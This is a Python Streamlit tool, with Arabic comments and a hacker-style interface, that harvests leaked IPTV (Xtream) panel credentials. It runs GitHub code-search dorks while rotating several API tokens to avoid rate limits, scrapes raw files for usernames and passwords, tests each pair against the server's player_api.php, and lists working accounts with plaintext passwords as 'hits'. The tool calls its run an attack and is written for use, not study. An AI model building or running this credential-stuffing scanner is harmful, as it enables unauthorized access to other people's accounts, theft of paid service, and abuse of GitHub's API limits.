import streamlit as st
import requests
import re
import time
from datetime import datetime

# إعدادات الواجهة
st.set_page_config(page_title="BEAST V32 - NUCLEAR SCAN", layout="wide")

if "auth" not in st.session_state: st.session_state.auth = False
if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V32 - THE FINAL BYPASS</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# ستايل الهكر المرعب
st.markdown("""
<style>
    .stApp { background-color: #000; }
    .terminal-text { color: #00ff41; font-family: 'Courier New', Courier, monospace; font-size: 12px; }
    .hit-card { 
        background: #0a0a0a; border: 1px double #00ff41; 
        padding: 15px; border-radius: 5px; margin-bottom: 10px;
        box-shadow: 0px 0px 10px #00ff4133;
    }
</style>
""", unsafe_allow_html=True)

with st.sidebar:
    st.title("🚀 BEAST V32 NUCLEAR")
    tokens_raw = st.text_area("أدخل التوكنات (واحد في كل سطر):", height=150)
    tokens_list = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
    
    st.subheader("🎯 إعدادات الاستهداف")
    target_word = st.text_input("بحث عن باقة معينة (مثلاً: bein):", "")
    depth = st.slider("عمق البحث في الصفحات:", 5, 50, 20)
    
    start_btn = st.button("🔥 إطلاق الهجوم الشامل")

# مساحات العرض
log_area = st.empty()
hits_area = st.container()

if start_btn and tokens_list:
    # دروكات "خبيثة" ومختلفة تماماً لزيادة النتائج
    mega_dorks = [
        f'"{target_word}" "get.php?username=" "password="' if target_word else 'extension:txt "get.php?username="',
        'extension:m3u "http://" "username=" "password="',
        'filename:settings.json "server_url" "password"',
        'filename:.env "XTREAM_USER"',
        'path:etc/php "username=" "password=" "http"',
        'extension:log "player_api.php" "password="'
    ]
    
    found_hits = 0
    t_idx = 0 # مؤشر التوكنات
    
    for dork in mega_dorks:
        for page in range(1, depth + 1):
            # تبديل التوكن لكل صفحة لزيادة السرعة وتجنب الحظر
            current_token = tokens_list[t_idx % len(tokens_list)]
            headers = {'Authorization': f'token {current_token}', 'Accept': 'application/vnd.github.v3+json'}
            
            try:
                log_area.markdown(f"<p class='terminal-text'>[SYSTEM] Using Token: {current_token[:10]}... | Dork: {dork[:30]} | Page: {page}</p>", unsafe_allow_html=True)
                
                # البحث باستخدام معايير مختلفة (sort by indexed لضمان السيرفرات الجديدة)
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100&sort=indexed"
                response = requests.get(search_url, headers=headers).json()
                
                if "items" not in response:
                    t_idx += 1 # التوكن ده تعب، خش على اللي بعده
                    time.sleep(1)
                    continue

                for item in response['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    try:
                        file_content = requests.get(raw_url, timeout=2).text
                        # Regex احترافي بيجيب السيرفر حتى لو في وسط كلام كتير
                        links = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", file_content)
                        
                        for host, user, pw in links:
                            try:
                                # فحص السيرفر
                                check_api = f"{host}/player_api.php?username={user}&password={pw}"
                                res_check = requests.get(check_api, timeout=2).json()
                                
                                if res_check.get("user_info", {}).get("status") == "Active":
                                    # جلب القنوات للتأكد من المحتوى
                                    cat_req = requests.get(f"{check_api}&action=get_live_categories", timeout=2).json()
                                    cat_names = [c['category_name'] for c in cat_req[:5]] if isinstance(cat_req, list) else ["No Data"]
                                    
                                    found_hits += 1
                                    with hits_area:
                                        st.markdown(f"""
                                        <div class="hit-card">
                                            <span style="color:#00ff41; font-weight:bold;">🏆 HIT #{found_hits}</span> | <code style="color:white;">{host}</code><br>
                                            <span style="color:#fbbf24;">USER: {user} | PASS: {pw}</span><br>
                                            <div style="color:#888; font-size:11px; margin-top:5px;">
                                                <b>📦 القوائم:</b> {' | '.join(cat_names)}
                                            </div>
                                        </div>
                                        """, unsafe_allow_html=True)
                            except: continue
                    except: continue
            except: 
                t_idx += 1
                continue
    log_area.success("✅ اكتمل الهجوم. راجع النتائج أعلاه.")
